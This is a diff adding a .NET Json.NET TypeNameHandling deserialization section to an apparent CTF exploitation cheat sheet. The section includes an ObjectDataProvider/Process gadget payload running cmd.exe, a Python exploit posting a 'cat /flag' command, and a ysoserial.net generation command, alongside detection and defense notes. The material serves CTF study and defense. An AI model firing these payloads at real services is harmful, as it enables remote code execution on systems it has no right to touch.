@@ -8,6 +8,7 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [Race Conditions (TOCTOU)](#race-conditions-toctou)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
 - [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
+- [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
 - [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
 
 ---
@@ -178,6 +179,71 @@ Java's `XMLDecoder` automatically instantiates classes and invokes methods from 
 ```
 
 **Key insight:** Unlike binary Java deserialization, XMLDecoder provides a text-based gadget-free path to RCE — no gadget chain needed.
+
+---
+
+## .NET JSON TypeNameHandling Deserialization (DefCamp 2017)
+
+**Pattern:** Json.NET (Newtonsoft.Json) with `TypeNameHandling.All` or `TypeNameHandling.Objects` deserializes the `$type` field to instantiate arbitrary classes. By injecting a `$type` value pointing to a privileged class in the loaded assemblies, an attacker can execute arbitrary code or access protected functionality.
+
+```csharp
+// Vulnerable server-side code:
+var settings = new JsonSerializerSettings {
+    TypeNameHandling = TypeNameHandling.All  // UNSAFE: deserializes $type field
+};
+var obj = JsonConvert.DeserializeObject(userInput, settings);
+```
+
+```json
+// Basic injection — instantiate a class with a dangerous constructor/property:
+{
+  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName": "Start",
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System",
+    "StartInfo": {
+      "$type": "System.Diagnostics.ProcessStartInfo, System",
+      "FileName": "cmd.exe",
+      "Arguments": "/c calc.exe"
+    }
+  }
+}
+```
+
+```json
+// Simpler: inject a custom application class to escalate privileges:
+{
+  "$type": "MyApp.Models.AdminCommand, MyApp",
+  "Action": "ReadFlag",
+  "TargetPath": "/flag.txt"
+}
+```
+
+```python
+import requests, json
+
+# Target: endpoint deserializing JSON with TypeNameHandling.All
+payload = {
+    "$type": "MyApp.Commands.ExecuteCommand, MyApp",
+    "Command": "cat /flag"
+}
+
+r = requests.post("http://target/api/process",
+                  json=payload,
+                  headers={"Content-Type": "application/json"})
+print(r.text)
+```
+
+**Gadget chains for RCE (ysoserial.net):**
+```bash
+# Generate Json.NET payload with ysoserial.net:
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
+# Common gadgets: ObjectDataProvider, WindowsIdentity, ActivitySurrogateSelector
+```
+
+**Detection:** .NET/ASP.NET application, JSON requests. Look for `$type` in API responses (if the server also serializes with TypeNameHandling). Check error messages for Newtonsoft.Json stack traces.
+
+**Key insight:** `$type` in Json.NET can instantiate any class in the loaded assemblies. Any class with dangerous constructors, implicit conversions, or settable properties that trigger side effects becomes an attack surface. Use `ysoserial.net` to enumerate known gadget chains. Defense: use `TypeNameHandling.None` (default) and a custom `ISerializationBinder` allowlist.
 
 ---
 
